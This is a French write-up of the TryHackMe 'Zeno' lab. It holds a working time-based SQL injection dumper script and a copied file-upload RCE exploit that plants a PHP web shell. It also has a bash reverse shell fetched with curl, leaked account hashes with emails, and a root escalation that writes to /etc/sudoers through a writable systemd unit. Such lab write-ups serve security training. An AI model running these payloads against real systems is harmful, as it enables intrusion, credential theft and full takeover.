# Zeno

![6aaead7a901eb44de0d69d31d4a6b5ae(1)](https://user-images.githubusercontent.com/68467919/210107803-97a91993-4f4b-47a0-9345-848957ab7b8b.jpeg)

Plateforme: **TryHackme**

Nom: **Zeno**

Difficulté: **Medium**

Infos: **security**, **rce**, **oscp**


## Énumération

### Nmap

Pour commencer nous allons énumérer la machine pour savoir quels ports sont accessibles, quels services fonctionnent sur la machine.

```bash
nmap -A -Pn -p- -o enum/nmap -vv $ip

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 092362a2186283690440623297ff3ccd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDakZyfnq0JzwuM1SD3YZ4zyizbtc9AOvhk2qCaTwJHEKyyqIjBaElNv4LpSdtV7y/C6vwUfPS34IO/mAmNtAFquBDjIuoKdw9TjjPrVBVjzFxD/9tDSe+cu6ELPHMyWOQFAYtg1CV1TQlm3p6WIID2IfYBffpfSz54wRhkTJd/+9wgYdOwfe+VRuzV8EgKq4D2cbUTjYjl0dv2f2Th8WtiRksEeaqI1fvPvk6RwyiLdV5mSD/h8HCTZgYVvrjPShW9XPE/wws82/wmVFtOPfY7WAMhtx5kiPB11H+tZSAV/xpEjXQQ9V3Pi6o4vZdUvYSbNuiN4HI4gAWnp/uqPsoR
|   256 33663536b0680632c18af601bc4338ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEMyTtxVAKcLy5u87ws+h8WY+GHWg8IZI4c11KX7bOSt85IgCxox7YzOCZbUA56QOlryozIFyhzcwOeCKWtzEsA=
|   256 1498e3847055e6600cc20977f8b7a61c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOKY0jLSRkYg0+fTDrwGOaGW442T5k1qBt7l8iAkcuCk
12340/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: We&#39;ve got some trouble | 404 - Resource not found
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
```

### Feroxbuster

Nous énumérons les différentes directories que nous pourrions accéder sur le site. J’utilise **feroxbuster** car c’est bien plus rapide selon moi que **gobuster** et cela me permet d’énumérer les répertoires **récursivements.**

```bash
feroxbuster -u http://ip:12340/ -w ~/SecLists/Discovery/Web-Content/raft-medium-words.txt -o enum/feroxbuster.txt

301      GET        7l       20w      239c http://10.10.108.144:12340/rms => http://10.10.108.144:12340/rms/
301      GET        7l       20w      246c http://10.10.108.144:12340/rms/images => http://10.10.108.144:12340/rms/images/
301      GET        7l       20w      245c http://10.10.108.144:12340/rms/admin => http://10.10.108.144:12340/rms/admin/
[...]
```

## **SQLi Time-Based**

En analysant un peu les requêtes que faisaient le serveur web, j’ai trouvé ce point d’injection plutôt intéressant.

![Untitled](https://user-images.githubusercontent.com/68467919/210107834-cb2df02a-e70e-406e-ad3b-5861c46f9933.png)

![Untitled 1](https://user-images.githubusercontent.com/68467919/210107843-77af0fb2-1831-4ee5-869c-0b83d357980a.png)

![Untitled 2](https://user-images.githubusercontent.com/68467919/210107854-d9ffd96b-b302-41b5-ae76-742a5e63b85f.png)

Vu que nous n’avons pas de retour visuel sur le résultat de notre requête mais seulement une erreur, j’ai essayé d’exploiter une SQLi Time Based. 

![Untitled 3](https://user-images.githubusercontent.com/68467919/210107864-c6fee17c-e75d-4afe-a6fe-5b8684dfccec.png)

Étant donné que je n’ai jamais vraiment exploité d’SQLi Time Based, je me suis aidé de ce writeup d’un autre CTF pour pouvoir m’orienter : 

[https://musyokaian.medium.com/time-based-sql-injection-hsctf-big-blind-writeup-f3a320d63ea8](https://musyokaian.medium.com/time-based-sql-injection-hsctf-big-blind-writeup-f3a320d63ea8)

Pour commencer, j’ai trouvé le moyen de pouvoir faire en sorte de sleep la réponse du serveur. 

```bash
/rms/cart-exec.php?id=26'-sleep(5)--+-&lt=food
```

Ce payload fonctionne, je reçois donc l’erreur du serveur 10 secondes après ma requête.

Par la suite, je vais essayer de déterminer le premier char du nom de la base de donnée courante qu’utilise le site web.

```bash
/rms/cart-exec.php?id=26'-(select+sleep(10)+from+dual+where+database()+like+'d%')--+-&lt=food
```

La réponse du serveur met encore dix secondes à s’afficher. Maintenant il est temps de tester toutes les possibilités ! 

J’ai crée un script pour pouvoir dump la base de donnée et ainsi peut-être pouvoir me connecter sur le site en tant qu’administrateur ou autre.

```python
#!/usr/bin/python3
import requests

URL = "http://10.10.167.176:12340/rms/cart-exec.php?id="
cookie = dict(PHPSESSID="d0v3j6s07jmsv6uulfgsj0n3s2") #Changer ca

database_list = [] #Si la base de donnée est déjà connue, rajoutez la dans la liste 
table_list = []
column_list = []

user_choice_database=""

def dump_data(url=URL, cookie=cookie, column_name=column_list, database=user_choice_database):
    [print('[',index_element,']: -> ',element) for index_element, element in enumerate(column_list)]
    
    user_choice = int(input('Quelle colonnes voulez-vous analyser ? (index) : '))

    i = 0
    restart = 75
    last_letter=""
    data_name=""
    data_leak=[]
    limit = 0
    substr_increment = 1

    while i < restart:
        try:
            for current_letter in range(33,122):
                    payload= f"'-(select sleep(10) from dual where (select substr({column_list[user_choice]},1,{substr_increment}) from {database_list[user_choice_database]} limit {limit},1) = '{last_letter+chr(current_letter)}')-- -"
                    response = requests.get(f"{url}{payload}&lt=food",cookies=cookie)
                    response_time = response.elapsed.total_seconds()
                    if(i > 75):
                        last_letter=""
                        substr_increment = 1
                        limit += 1
                        i = 0
                        data_leak.append(data_name.lower())
                    if(response_time < 5):
                        i+=1
                        pass
                    else:
                        last_letter += chr(current_letter)
                        substr_increment += 1
                        data_name = last_letter              
                        print('[+] data retrieved:',data_name.lower())
                        i = 0

            for data in data_leak:
                print(data)

        except IndexError:
            print('Veuillez choisir un index valable')

def get_columns_name(url=URL, cookie=cookie, table_name=table_list, database=user_choice_database):

    [print('[',index_element,']: -> ',element) for index_element, element in enumerate(table_list)]
    
    user_choice_table = int(input('Quelle table voulez-vous analyser ? (index) : '))

    global column_list

    i = 0
    restart = 75
    last_letter=""
    column_name=""
    limit = 0
    substr_increment = 1

    while i < restart:
        try:
            for current_letter in range(33,122):
                    payload = f"'-(select sleep(10) from dual where (select substr(column_name,1,{substr_increment}) from information_schema.columns where table_name='{table_list[user_choice_table]}' and table_schema='{database_list[user_choice_database]}' limit {limit},1)='{last_letter+chr(current_letter)}')-- -"
                    response = requests.get(f"{url}{payload}&lt=food",cookies=cookie)
                    response_time = response.elapsed.total_seconds()
                    if(i > 75):
                        last_letter=""
                        column_list.append(column_name.lower())
                        substr_increment = 1
                        limit += 1
                        i = 0
                    if(response_time < 5):
                        i+=1
                        pass
                    else:
                        last_letter += chr(current_letter)
                        substr_increment += 1
                        column_name = last_letter              
                        print('[+] column_name:',column_name.lower())
                        i = 0

        except IndexError:
            print('Veuillez choisir un index valable')

def get_tables_name(url=URL, cookie=cookie, database=database_list):

    global table_list
    global user_choice_database

    [print('[',index_element,']: -> ',element) for index_element, element in enumerate(database_list)]
    
    user_choice_database = int(input('Quelle database voulez-vous analyser ? (index) : '))

    i = 0
    restart = 75
    last_letter=""
    table_name=""
    limit = 0
    substr_increment = 1

    while i < restart:
        for current_letter in range(33,122):
                payload=f"'-(select sleep(5) from dual where (select substr(table_name,1,{substr_increment}) from information_schema.tables where table_schema='{database[user_choice_database]}' limit {limit},1) ='{last_letter + chr(current_letter)}')-- -"
                response = requests.get(f"{url}{payload}&lt=food",cookies=cookie)
                response_time = response.elapsed.total_seconds()
                if(i > 75):
                    limit += 1
                    substr_increment = 1
                    last_letter=""
                    table_list.append(table_name.lower())
                    i = 0
                if(response_time < 5):
                    i+=1
                    pass
                else:
                    substr_increment += 1
                    last_letter += chr(current_letter)
                    table_name = last_letter              
                    print('[+] table_name:',table_name.lower(), end='')
                    i = 0
    for table in table_list:
        print(table)

def get_database(url=URL, cookie=cookie):

    global database_list

    db_name=""
    last_letter=""

    i = 0
    limit = 0
    substr_increment = 0
    restart = 75

    while i < restart:
        for current_letter in range(33,122):
            payload=f"'-(select sleep(10) from dual where (select substr(schema_name,1,{substr_increment}) from information_schema.schemata limit {limit},1)='{last_letter+chr(current_letter)}')-- -"
            response = requests.get(f"{url}{payload}&lt=food",cookies=cookie)
            response_time = response.elapsed.total_seconds()
            if chr(current_letter) == '+' or chr(current_letter) == '*':
                pass
            if(i > 75):
                limit += 1
                substr_increment = 1
                last_letter=""
                database_list.append(db_name.lower())
                i = 0
            if(response_time < 10):
                i+=1
                pass
            else:
                substr_increment += 1
                last_letter += chr(current_letter)
                db_name = last_letter              
                print('[+] db_name:',db_name.lower(), sep='')
                i = 0

def main():
    get_database()
    get_tables_name()
    get_columns_name()
    dump_data()

main()
```

*(certaines choses sont à modifier mais ça suffit amplement pour ce CTF)*

Après l’exécution du script, nous pouvons voir que notre payload retrouve la base de donnée suivante : 

![Untitled 4](https://user-images.githubusercontent.com/68467919/210107881-d59c59fa-0893-489d-abae-c85e635e49ea.png)

Après avoir sélectionné cette base de donnée, nous allons pouvoir voir les tables à l’intérieur : 

![Untitled 5](https://user-images.githubusercontent.com/68467919/210107889-7b5d0fa6-9fb0-4ec6-8927-809174062988.png)

**pizza_admin**, **users**, **staff** et **members** pourraient peut-être contenir des informations compromettantes. 

Malheureusement il n’y a rien dans la table ***users*** ni dans la table **staff**. 

Je vais donc chercher dans ***pizza_admin***.

![Untitled 6](https://user-images.githubusercontent.com/68467919/210107902-09c29210-8070-4135-8a2b-d941ac8fd15c.png)

Nous pouvons garder ce mot de passe même si je doute qu’il soit possible de le réutiliser plus tard.

Dans la table ***members***, voici les tables qui s’y trouvent : 

![Untitled 7](https://user-images.githubusercontent.com/68467919/210107911-6b603d7f-1e0b-423b-9aa3-84e4c447dc22.png)

Nous pouvons trouver les données suivantes dans les colonnes **login** et **passwd** : 

| email | hash | cracked |
| --- | --- | --- |
| jsmith@sample | 1254737c076cf867dc53d60a0364f38e | jsmith123 |
| edward@zeno.com | 6f72ea079fd65aff33a67a3f3618b89c | ?? |
| omolewastephen@gmail.com | 81dc9bdb52d04dc20036dbd8313ed055 | 1234 |

Aucun de ces mots de passes me permettent de me connecter en SSH ou sur un compte admin. 

## Restaurant Management System (RMS)

En regardant un peu le site et en cherchant sur internet “Restaurant Management System”, nous pouvons remarquer que ce système de gestion est vulnérable à une RCE.

[Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/47520)

*Restaurant Management System*: 

[Restaurant Management System using PHP/MySQLi with Source Code](https://www.sourcecodester.com/php/11815/restaurant-management-system.html)

```python
#!/usr/bin/python

import requests
import sys

print ("""
    _  _   _____  __  __  _____   ______            _       _ _
  _| || |_|  __ \|  \/  |/ ____| |  ____|          | |     (_) |
 |_  __  _| |__) | \  / | (___   | |__  __  ___ __ | | ___  _| |_
  _| || |_|  _  /| |\/| |\___ \  |  __| \ \/ / '_ \| |/ _ \| | __|
 |_  __  _| | \ \| |  | |____) | | |____ >  <| |_) | | (_) | | |_
   |_||_| |_|  \_\_|  |_|_____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                             | |
                                             |_|

""")
print ("Credits : All InfoSec (Raja Ji's) Group")
url = sys.argv[1]

if len(sys.argv[1]) < 8:
        print("[+] Usage : python rms-rce.py http://localhost:80/")
        exit()

print ("[+] Restaurant Management System Exploit, Uploading Shell")

target = url+"admin/foods-exec.php"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "327",
    "Content-Type": "multipart/form-data;boundary=---------------------------191691572411478",
    "Connection": "close",
    "Referer": "http://localhost:8081/rms/admin/foods.php",
    "Cookie": "PHPSESSID=4dmIn4q1pvs4b79",
    "Upgrade-Insecure-Requests": "1"

}
 
data = """
-----------------------------191691572411478
Content-Disposition: form-data; name="photo"; filename="reverse-shell.php"
Content-Type: text/html

<?php echo shell_exec($_GET["cmd"]); ?>
-----------------------------191691572411478
Content-Disposition: form-data; name="Submit"

Add
-----------------------------191691572411478--
"""
r = requests.post(target,verify=False, headers=headers,data=data,
proxies={"http":"http://127.0.0.1:8080"})

print("[+] Shell Uploaded. Please check the URL :"+url+"images/reverse-shell.php")

```

En capturant la requête avec BurpSuite, je remarque que l’upload fonctionne (je n’ai pas eu de retour dans mon terminal). Puis en accédant au répertoire */rms/images/reverse-shell.php*, j’ai pu remarquer que le fichier était bien présent et que je vais pouvoir exécuter des commandes pour pouvoir obtenir un reverse-shell ! 

![Untitled 8](https://user-images.githubusercontent.com/68467919/210107925-5ba4a78f-114f-4454-9712-afb5a4c3a006.png)

![Untitled 9](https://user-images.githubusercontent.com/68467919/210107983-254285e6-921b-47e3-8f83-3db09d76ca82.png)

L’exploit fonctionne bien. Je vais désormais upload un script en bash pour pouvoir obtenir un reverse-shell.

*script.sh*

```python
#!/bin/bash

bash -i >& /dev/tcp/ip/1337 0>&1
```

```bash
/reverse-shell.php?cmd=curl http://ip:4445/script.sh -o script.sh
```

![Untitled 10](https://user-images.githubusercontent.com/68467919/210107997-ef8c767e-5032-4654-9029-952dab484a86.png)

```bash
/reverse-shell.php?cmd=bash script.sh
```

![Untitled 11](https://user-images.githubusercontent.com/68467919/210108012-e8fa756b-cfbf-49e6-9f4b-387b3622bb63.png)

## Reverse-Shell

En regardant dans */var/www/html/rms/index.php* nous pouvons trouver les identifiants de connexion à la base de donnée au début du script

![Untitled 12](https://user-images.githubusercontent.com/68467919/210108018-a12dc620-e057-47e9-bde9-d97fb46fa573.png)

Nous pouvons lancer le script *linpeas.sh* après l’avoir upload sur la machine pour chercher des fichiers compromettant.

![Untitled 13](https://user-images.githubusercontent.com/68467919/210108026-5848fe11-c8fd-4102-9a3b-bd0ba686c342.png)

Nous pouvons trouver ce résultat là qui nous montre que nous avons les droits d’écriture sur le fichier zeno-monitoring.service.

*/etc/systemd/system/zeno-monitoring.service*

```bash
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/root/zeno-monitoring.py

[Install]
WantedBy=multi-user.target
```

ExecStart pourrait nous aider à pouvoir obtenir des droits plus élevés (genre root). Malheureusement nous ne pouvons pas utiliser systemctl pour pouvoir activé ce service ou le redémarrer.

## Edward | User.txt

Après avoir énumérer la machine, nous pouvons trouver dans le fichier */etc/fstab* un mot de passe en clair. *Fstab* est composé de plusieurs lignes décrivant chacune les conditions de montage de chaque partition / système de fichier.

En essayant à chaque fois les mots de passes que je trouvais pour me connecter au compte d’Edward, celui-ci fonctionne.

![Untitled 14](https://user-images.githubusercontent.com/68467919/210108029-9ddcc5b5-ba90-4ff0-ba63-ce72e4bd2d73.png)

Nous pouvons nous connecter en SSH en ajoutant notre clé public au fichier authorized_keys.

## Root | Root.txt

Le fichier ***zeno-monitoring.service*** est très intéressant et pourrait nous permettre d’obtenir un shell ou de faire ce que nous voulons sur la machine. 

Alors pourquoi ce fichier la et pas un autre? Nous avons le droit d’exécuter la commande reboot en tant que root sur la machine. En rebootant la machine, la partie “**ExecStart**” va donc s’exécuter (comme son nom l’indique) quand la machine aura redémarré. Nous pouvons donc rentrer n’importe quelle commande. 

[Privilege Escalation: Leveraging misconfigured systemctl permissions](https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49)

Après avoir essayé plusieurs payloads comme un reverse-shell ou bien de créer un fichier avec des droits SUID, rien ne fonctionnait (peut-être que je m’y suis mal pris). J’ai réussi à créer un fichier du nom de “root.sh” en modifiant donc la ligne “ExecStart”, mais un message d’erreur me disant que je n’avais pas l’autorisation d’exécuter tel ou tel commande en tant que root m’empêchait d’exécuter le script en question. 

![Untitled 15](https://user-images.githubusercontent.com/68467919/210108040-4b55f5a0-5525-4e0c-956c-4efab85cef38.png)

J’ai donc décidé de me pencher vers ce payload qui va nous permettre d’exécuter n’importe quoi en tant que root que j’ai trouvé ici : 

[PayloadsAllTheThings/Linux - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#writable-files)

```bash
echo "edward ALL=(ALL:ALL) ALL">>/etc/sudoers
```

Donc pour finaliser le payload, voici ce que j’ai modifié à l’aide de *vi* dans le fichier **zeno-monitoring.service**.

```bash
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "echo 'edward ALL=(ALL:ALL) ALL'>>/etc/sudoers"

[Install]
WantedBy=multi-user.target
```

Ensuite, il suffit de faire la commande suivante pour reboot la machine et au bout de quelques minutes j’ai pu me reconnecter en SSH à la machine et j’avais bien le droit d’exécuter toutes les commandes.

```bash
sudo -u /usr/sbin/reboot
```

![image](https://user-images.githubusercontent.com/68467919/210108520-ca92a636-b94d-4123-bebd-7524898d2386.png)

ROOTED !!!
